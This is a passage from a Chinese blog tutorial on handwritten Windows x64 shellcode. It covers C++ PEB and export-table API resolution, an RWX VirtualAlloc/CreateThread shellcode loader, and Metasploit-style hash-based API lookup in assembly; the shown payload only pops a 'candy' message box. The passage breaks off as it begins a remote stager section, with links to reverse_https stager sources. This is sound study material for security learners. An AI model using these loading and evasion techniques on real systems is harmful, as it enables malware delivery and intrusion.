class="hljs-keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer) &#123;<br><br>            <span class="hljs-type">wchar_t</span>* fullDllPath = pEntry-&gt;FullDllName.Buffer;<br><br>            <span class="hljs-comment">// 提取 DLL 名称</span><br>            <span class="hljs-type">wchar_t</span>* CurrentDllName = <span class="hljs-built_in">ExtractDllName</span>(fullDllPath);<br><br>            <span class="hljs-comment">// 比较 DLL 名称（不区分大小写）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringW</span>(CurrentDllName, TargertDllName)) &#123;<br>                <span class="hljs-comment">// 找到目标 DLL</span><br>                HMODULE hModule = (HMODULE)pEntry-&gt;DllBase;<br><br>                <span class="hljs-comment">// 分析 PE 文件找到导出表</span><br>                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + ((PIMAGE_DOS_HEADER)hModule)-&gt;e_lfanew);<br>                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +<br>                    pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br>                <span class="hljs-comment">// 获取导出表的各个信息</span><br>                DWORD* pFunctionNames = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNames);<br>                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfFunctions);<br>                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNameOrdinals);<br><br>                <span class="hljs-comment">// 遍历导出表，查找目标函数</span><br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;<br>                    <span class="hljs-type">char</span>* functionName = (<span class="hljs-type">char</span>*)((BYTE*)hModule + pFunctionNames[i]);<br><br>                    <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringA</span>(functionName, ApiName)) &#123;<br>                        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + pFunctionAddresses[pFunctionOrdinals[i]]);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果遍历完导出表未找到函数，返回 NULL</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br><br>        pCurrentEntry = pCurrentEntry-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到模块</span><br>&#125;<br><br>__declspec(<span class="hljs-built_in">code_seg</span>(<span class="hljs-string">&quot;.text$A&quot;</span>)) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 1. 函数声明</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* MyMessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT  uType)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* MyGetProcAddress)</span><span class="hljs-params">(HMODULE hModule, LPCSTR  lpProcName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* MyLoadLibraryA)</span><span class="hljs-params">(LPCSTR lpLibFileName)</span></span>;<br><br>    <span class="hljs-comment">// 2. 需要用到的API和DLL的名称</span><br>    CHAR messageBoxA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR loadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR getProcAddress[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR kernel32[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR User32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR candy[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span> ,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 3.动态获取API函数</span><br>    MyGetProcAddress pGetProcAddress = (MyGetProcAddress)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, getProcAddress);<br>    MyLoadLibraryA pLoadLibraryA = (MyLoadLibraryA)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, loadLibraryA);<br>    MyMessageBoxA pMessageBoxA = (MyMessageBoxA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(User32), messageBoxA);<br><br>    <span class="hljs-comment">// 4. 完成相应的功能</span><br>    <span class="hljs-built_in">pMessageBoxA</span>(<span class="hljs-literal">NULL</span>, candy, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>__declspec(code_seg(&quot;.text$A&quot;))</code>的意思是把下面定义的函数放进指定的节（Section）中去编译链接。其中<code>$A</code>表示将函数放置到第一个子节中，即放置在<code>.text</code>节的最前面。因此如果不带上<code>__declspec(code_seg(&quot;.text$A&quot;))</code>则无法通过导出<code>.text</code>作为 shellcode。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276212372-55dd68cf-aa13-40d0-a76e-3629c2565054.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276246118-3438a38a-718b-4910-9f08-5ce79df17b50.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>额，别的先不说，为啥我编译出来的导出有 5kb，而 one day 师傅导出的只有 1kb，难道 visual studio2022 编译策略变了？</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760275817263-6e26f9cc-9f9c-4fd6-83f7-62981679fe76.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276264031-47cae63c-24cf-42c9-b68a-b9c40d9eae68.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>最后将导出的 shellcode 放置到下方的程序中执行；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">// 将刚才从010Editor导出的shellcode替换上来</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = &#123;<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-comment">// 申请一块大小为buf字节数组长度的可读可行的内存区域</span><br>    LPVOID pMemory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将buf数组中的内容复制到刚刚分配的内存区域</span><br>    <span class="hljs-built_in">RtlMoveMemory</span>(pMemory, buf, <span class="hljs-built_in">sizeof</span>(buf));<br><br>    <span class="hljs-comment">// 创建一个线程执行内存中的代码</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 等待线程执行完成</span><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760276371171-2dcebcf4-68fe-4860-92eb-36603a7907e4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="4-2-纯汇编获取弹窗-shellcode"><a href="#4-2-纯汇编获取弹窗-shellcode" class="headerlink" title="4.2 纯汇编获取弹窗 shellcode"></a>4.2 纯汇编获取弹窗 shellcode</h2><p>对于的废话不说了，说了也白说，开干！（one day 师傅还研究了以下 x86 的 shellcode 生成，但是个人感觉，完全没有必要，如果后面我觉得有必要了，我会再补相关知识，嘻嘻嘻）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/stager/stager_reverse_https.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/stager/stager_reverse_https.asm</a></p>
<p>三个链接的汇编代码都需要研究清楚，方便后续我们将其结合进行调用；</p>
<ul>
<li>block_api.asm：代码通过动态解析哈希值来定位所需的API函数地址</li>
</ul>
<p>这里我就不对代码做过多解释了，详细的解释直接参考 one day 师傅文章的介绍<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17961">https://xz.aliyun.com/news/17961</a></p>
<p>最后编写出来的 x64 版本的弹窗 shellcode 如下，通过导出<code>.text</code>节的内容作为 shellcode，最终 shellcode 大小为<code>279</code>字节。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code<br><br>main PROC<br>    cld<br>    and rsp, 0FFFFFFFFFFFFFFF0h<br>    <br>    ; LoadLibraryA(&quot;user32.dll&quot;)<br>    mov r10d, 0DEC21CCDh         ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>    lea rcx, user32dll<br>    call GetProcAddressByHash<br>    add rsp, 20h<br><br>    ; MessageBoxA(NULL, &quot;candy&quot;, &quot;candy&quot;, MB_OK)<br>    mov r10d, 790E24F0h        ; hash( &quot;user32.dll&quot;, &quot;MessageBoxA&quot; )<br>    xor rcx, rcx                ; hWnd = NULL<br>    lea rdx, candy              ; lpText = &quot;candy&quot;<br>    lea r8,  candy              ; lpCaption = &quot;candy&quot;<br>    xor r9d, r9d                ; uType = MB_OK<br>    call GetProcAddressByHash<br>    add rsp, 20h<br>    ret<br><br>GetProcAddressByHash:<br>    push r9                   ; 保存第4个参数<br>    push r8                   ; 保存第3个参数<br>    push rdx                  ; 保存第2个参数<br>    push rcx                  ; 保存第1个参数<br>    push rsi                  ; 保存 RSI<br>    xor rdx, rdx              ; 清零 rdx<br>    mov rdx, gs:[rdx+60h]     ; 获取 PEB 的指针<br>    mov rdx, [rdx+18h]        ; 获取 PEB-&gt;Ldr<br>    mov rdx, [rdx+20h]        ; 从 InMemoryOrder 模块列表中获取第一个模块<br><br>next_mod:<br>    mov rsi, [rdx+50h]        ; 获取模块名称的指针 (unicode 字符串)<br>    movzx rcx, word ptr [rdx+48h] ; 将 rcx 设置为我们要检查的长度<br>    xor r9, r9                ; 清零 r9，它将存储模块名称的哈希值<br>loop_modname:<br>    xor rax, rax              ; 清零 rax<br>    lodsb                     ; 读取名称的下一个字节<br>    cmp al, &#x27;a&#x27;               ; 某些版本的 Windows 使用小写模块名称<br>    jl not_lowercase<br>    sub al, 20h               ; 如果是，则标准化为大写<br>not_lowercase:<br>    ror r9d, 0dh              ; 右旋转我们的哈希值<br>    add r9d, eax              ; 添加名称的下一个字节<br>    loop loop_modname         ; 循环直到我们读取足够的数据<br>    ; 现在我们已经计算了模块哈希<br>    push rdx                  ; 保存模块列表中的当前位置，供后续使用<br>    push r9                   ; 保存当前模块哈希，供后续使用<br>    ; 继续遍历导出地址表<br>    mov rdx, [rdx+20h]        ; 获取此模块的基地址<br>    mov eax, dword ptr [rdx+3ch] ; 获取 PE 头<br>    add rax, rdx              ; 添加模块的基地址<br>    cmp word ptr [rax+18h], 20Bh ; 这个模块实际上是 PE64 可执行文件吗？<br>    ; 这个测试用例涵盖了在 wow64 上运行但在通过 nativex64.asm 的原生 x64 上下文中的情况<br>    ; 在 PEB 的模块列表中可能存在 PE32 模块（通常是主模块）<br>    ; 由于我们使用的是 win64 PEB ([gs:96])，我们不会看到 win32 PEB ([fs:48]) 中存在的 wow64 模块<br>    jne get_next_mod1         ; 如果不是，继续处理下一个模块<br>    mov eax, dword ptr [rax+88h] ; 获取导出表的 RVA<br>    test rax, rax             ; 测试是否没有导出地址表<br>    jz get_next_mod1          ; 如果没有 EAT，处理下一个模块<br>    add rax, rdx              ; 添加模块的基地址<br>    push rax                  ; 保存当前模块的 EAT<br>    mov ecx, dword ptr [rax+18h] ; 获取函数名称的数量<br>    mov r8d, dword ptr [rax+20h] ; 获取函数名称的 rva<br>    add r8, rdx               ; 添加模块的基地址<br>    ; 计算模块哈希 + 函数哈希<br>get_next_func:<br>    jrcxz get_next_mod        ; 当我们到达 EAT 的开始（我们向后搜索）时，处理下一个模块<br>    dec rcx                   ; 递减函数名称计数器<br>    mov esi, dword ptr [r8+rcx*4h] ; 获取下一个模块名称的 rva<br>    add rsi, rdx              ; 添加模块的基地址<br>    xor r9, r9                ; 清零 r9，它将存储函数名称的哈希值<br>    ; 并将其与我们想要的进行比较<br>loop_funcname:<br>    xor rax, rax              ; 清零 rax<br>    lodsb                     ; 读取 ASCII 函数名称的下一个字节<br>    ror r9d, 0dh              ; 右旋转我们的哈希值<br>    add r9d, eax              ; 添加名称的下一个字节<br>    cmp al, ah                ; 将 AL（名称的下一个字节）与 AH（null）进行比较<br>    jne loop_funcname         ; 如果我们没有到达 null 终止符，继续<br>    add r9, [rsp+8]           ; 将当前模块哈希添加到函数哈希<br>    cmp r9d, r10d             ; 将哈希与我们正在搜索的进行比较<br>    jnz get_next_func         ; 如果没有找到，去计算下一个函数哈希<br>    ; 如果找到，修复栈，调用函数，然后计算下一个...<br>    pop rax                   ; 恢复当前模块的 EAT<br>    mov r8d, dword ptr [rax+24h] ; 获取序数表的 rva<br>    add r8, rdx               ; 添加模块的基地址<br>    mov cx, [r8+2*rcx]        ; 获取所需函数的序数<br>    mov r8d, dword ptr [rax+1ch] ; 获取函数地址表的 rva<br>    add r8, rdx               ; 添加模块的基地址<br>    mov eax, dword ptr [r8+4*rcx] ; 获取所需函数的 RVA<br>    add rax, rdx              ; 添加模块的基地址以获取函数的实际 VA<br>    ; 我们现在修复栈并执行对所需函数的调用...<br>finish:<br>    pop r8                    ; 清除当前模块的哈希<br>    pop r8                    ; 清除模块列表中的当前位置<br>    pop rsi                   ; 恢复 RSI<br>    pop rcx                   ; 恢复第1个参数<br>    pop rdx                   ; 恢复第2个参数<br>    pop r8                    ; 恢复第3个参数<br>    pop r9                    ; 恢复第4个参数<br>    pop r10                   ; 弹出返回地址<br>    sub rsp, 20h              ; 为四个寄存器参数保留空间 (4 * sizeof(QWORD) = 0x20)<br>                              ; 如果需要，调用者有责任恢复 RSP（或分配更多空间或对齐 RSP）<br>    push r10                  ; 压回返回地址<br>    jmp rax                   ; 跳转到所需的函数<br>    ; 我们现在自动返回到正确的调用者...<br>get_next_mod:<br>    pop rax                   ; 弹出当前（现在是前一个）模块的 EAT<br>get_next_mod1:<br>    pop r9                    ; 弹出当前（现在是前一个）模块的哈希<br>    pop rdx                   ; 恢复我们在模块列表中的位置<br>    mov rdx, [rdx]            ; 获取下一个模块<br>    jmp next_mod              ; 处理这个模块<br><br>main endp<br><br>; 字符串常量（位于 .text 段）<br>user32dll    db &quot;user32.dll&quot;, 0<br>candy        db &quot;candy&quot;, 0<br>end<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760349252571-ede6040c-a6f7-439f-a839-17c621c7e29e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h1 id="五、stager-shellcode"><a href="#五、stager-shellcode" class="headerlink" title="五、stager shellcode"></a>五、stager shellcode</h1><p>这里我采用的学习思路是先实现 cpp 实现一些远程 shellcode 加载，理解其思想和实现思路，然后再通过纯汇编实现相关的功能；</p>
<h2 id="5-1-cpp-实现远程-shellcode（wininet）"><a href="#5-1-cpp-实现远程-shellcode（wininet）" class="headerlink" title="5.1 cpp 实现远程 shellcode（wininet）"></a>5.1 cpp 实现远程 shellcode（wininet）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// wininet4stager.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Winhttp.h&gt;</span></span><br><br><span class="hljs-comment">// 自定义宽字符转小写（简化版 Unicode 支持）</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span> <span class="hljs-title">my_towlower</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> c)</span> </span>&#123;<br>    <span class="hljs-comment">// 基础拉丁字母（A-Z）直接转换</span><br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> c + <span class="hljs-number">32</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> 